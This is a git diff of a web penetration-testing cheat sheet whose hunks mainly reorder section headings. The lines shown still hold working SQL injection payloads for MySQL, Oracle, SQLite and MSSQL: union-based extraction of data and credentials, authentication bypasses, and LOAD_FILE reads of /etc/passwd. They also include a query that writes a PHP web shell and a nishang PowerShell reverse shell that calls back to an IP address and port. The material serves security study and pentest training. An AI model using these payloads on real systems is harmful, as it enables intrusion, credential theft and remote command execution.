@@ -1,14 +1,13 @@
 # Pentest Web
-## SQL Injection and Abuse MSSQL
-### SQL Injection - MySQL/MariaDB
--> get version
-```
--1 union select 1,2,version();#
-```
-
+## SQL Injection - MySQL/MariaDB
 -> get number columns
 ```
 -1 order by 3;#
+```
+
+-> get version
+```
+-1 union select 1,2,version();#
 ```
 
 -> get database name
@@ -31,19 +30,19 @@
 -1 union select 1,2, group_concat(<column_names>) from <database_name>.<table_name>;#
 ```
 
-#### Webshell via SQLI - MySQL
+### Webshell via SQLI - MySQL
 ```
 LOAD_FILE('/etc/httpd/conf/httpd.conf')    
 select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";
 ```
  
-#### Reading Files via SQLI - MySQL
+### Reading Files via SQLI - MySQL
 e.g.  
 ```
 SELECT LOAD_FILE('/etc/passwd')
 ```
 
-### Oracle SQL
+## Oracle SQL
 -> Bypass Authentication
 ```
 ' or 1=1--
@@ -69,7 +68,7 @@ SELECT LOAD_FILE('/etc/passwd')
 ' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
 ```
 
-### SQLite Injection
+## SQLite Injection
 -> extracting table names, not displaying standard sqlite tables
 ```
 http://site.com/index.php?id=-1 union select 1,2,3,group_concat(tbl_name),4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
@@ -82,8 +81,7 @@ http://site.com/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM
 -> Reference  
 https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf
 
-
-### MSSQL Injection
+## MSSQL Injection
 -> Bypass Authentication
 ```
 ' or 1=1--
@@ -104,7 +102,7 @@ https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-ap
 ```
 https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 
-### Abuse MSSQL
+## Abuse MSSQL
 -> edit Invoke-PowerShellTcp.ps1, adding this:  
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
@@ -282,3 +280,5 @@ https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/word
 	
 -> poisoning.txt  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/posoning.txt  
+
+
